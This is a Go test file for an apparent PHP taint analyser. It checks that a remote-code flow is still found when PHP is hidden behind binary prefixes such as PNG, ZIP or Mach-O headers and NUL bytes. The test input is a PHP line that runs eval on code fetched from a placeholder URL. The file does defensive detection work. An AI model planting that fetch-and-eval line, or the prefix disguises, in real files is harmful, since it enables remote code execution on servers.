package phptaint

import (
	"bytes"
	"context"
	"testing"
)

// PHP emits bytes outside its tags verbatim, including binary headers and
// NULs. They cannot establish that a later remote-code flow is inert.
func TestPHPAfterBinaryPrefixIsAnalyzed(t *testing.T) {
	for name, prefix := range map[string]string{
		"NUL":             "\x00",
		"BOM and NUL":     "\xef\xbb\xbf\x00",
		"HTML comment":    "<!--\x00-->",
		"gettext catalog": "\xde\x12\x04\x95\x00\x00\x00\x00",
		"Mach-O binary":   "\xcf\xfa\xed\xfe\x00\x00\x00\x01",
		"PNG image":       "\x89PNG\r\n\x1a\n\x00",
		"ZIP archive":     "PK\x03\x04\x14\x00\x00\x00",
		"chunk boundary":  string(bytes.Repeat([]byte{0}, foldChunkBytes-2)),
	} {
		for _, tag := range []string{"<?php ", "<?PHP ", "<? ", "<?= "} {
			t.Run(name+"/"+tag, func(t *testing.T) {
				src := []byte(prefix + tag + "eval(file_get_contents('https://example.invalid/payload')); ?>")
				if !isCandidate(src) {
					t.Error("binary prefix hid a PHP candidate")
				}
				if !MayBePHPSource(src) {
					t.Error("binary prefix hid PHP from the oversize gate")
				}
				report := Analyze(context.Background(), src)
				if report.Status != StatusAnalyzed || report.TotalResults != 1 || len(report.Results) != 1 {
					t.Fatalf("report = %+v, want one remote-code flow", report)
				}
				if report.Results[0].Source != "file_get_contents" || report.Results[0].Sink != "eval" {
					t.Fatalf("unexpected flow: %+v", report.Results[0])
				}
			})
		}
	}
}
